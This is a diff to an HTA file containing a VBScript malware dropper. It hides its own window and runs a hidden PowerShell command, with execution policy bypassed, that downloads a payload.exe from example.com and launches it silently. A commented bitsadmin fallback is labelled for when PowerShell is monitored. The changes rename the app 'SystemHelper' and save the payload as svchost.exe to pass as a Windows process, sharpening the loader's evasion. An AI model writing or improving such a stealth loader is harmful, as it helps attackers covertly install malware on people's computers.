@@ -1,6 +1,6 @@
 <hta:application
   id="oHTA"
-  applicationname="HiddenLoader"
+  applicationname="SystemHelper"
   border="none"
   caption="no"
   showintaskbar="no"
@@ -14,17 +14,17 @@
 />
 
 <script language="VBScript">
-  ' ==== Ensure window never appears ====
-  Window.resizeTo 0, 0
-  Window.moveTo -2000, -2000
-  Set objShell = CreateObject("Wscript.Shell")
-
-  ' ==== Method 1: Direct silent execution (best) ====
-  objShell.Run "cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://example.com/payload.exe';$out='%temp%\payload.exe';Invoke-WebRequest $url -OutFile $out;Start-Process -WindowStyle Hidden $out""", 0, False
-
-  ' ==== Method 2: Alternative (if PowerShell is monitored) ====
-  ' objShell.Run "cmd /c bitsadmin /transfer payload /download /priority high https://example.com/payload.exe %temp%\payload.exe && start /b %temp%\payload.exe", 0, False
-
-  ' ==== Close HTA immediately ====
-  Self.Close()
+  ' Immediately hide window before anything renders
+  Window.resizeTo 0,0
+  Window.moveTo -2000,-2000
+  Set objShell = CreateObject("WScript.Shell")
+  
+  ' Method 1: Direct silent execution (best)
+  objShell.Run "cmd /q /c start /b powershell -WindowStyle Hidden -Exec Bypass -C ""$p=$env:temp+'\svchost.exe';iwr 'https://example.com/payload.exe' -out $p;Start-Process -WindowStyle Hidden $p""", 0, False
+  
+  ' Method 2: Alternative using bitsadmin (no PowerShell)
+  ' objShell.Run "cmd /q /c bitsadmin /transfer payload /download /priority high https://example.com/payload.exe %temp%\svchost.exe & start /b %temp%\svchost.exe", 0, False
+  
+  ' Force close HTA immediately
+  window.setTimeout "Self.Close()", 100
 </script>
